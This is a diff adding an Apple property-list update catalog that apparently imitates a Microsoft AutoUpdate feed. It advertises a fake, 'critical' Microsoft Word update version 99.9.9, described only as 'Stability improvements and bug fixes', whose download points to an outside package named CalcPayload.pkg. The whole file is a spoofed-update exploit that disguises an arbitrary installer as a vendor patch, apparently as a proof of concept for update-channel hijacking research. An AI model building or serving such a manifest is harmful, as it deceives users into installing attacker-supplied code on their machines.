@@ -1,0 +1,45 @@
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+  <plist version="1.0">
+  <dict>
+    <key>CatalogVersion</key>
+    <string>1</string>
+
+    <key>Updates</key>
+    <array>
+      <dict>
+        <key>Application ID</key>
+        <string>MSWD2019</string>
+
+        <key>Title</key>
+        <string>Microsoft Word Update</string>
+
+        <key>Version</key>
+        <string>99.9.9</string>
+
+        <key>Build</key>
+        <string>9990000</string>
+
+        <key>Payload</key>
+        <array>
+          <dict>
+            <key>DownloadURL</key>
+            <string>https://github.com/f0rum/PCI/raw/refs/heads/master/CalcPayload.pkg</string>
+
+            <key>Hash</key>
+            <string>30a19962d6b7163ddf55e6db769314c181f2002444d5329f10fc37f2745803d0</string>
+
+            <key>Size</key>
+            <integer>2473</integer>
+          </dict>
+        </array>
+
+        <key>CriticalUpdate</key>
+        <true/>
+
+        <key>Short Description</key>
+        <string>Stability improvements and bug fixes.</string>
+      </dict>
+    </array>
+  </dict>
+  </plist>
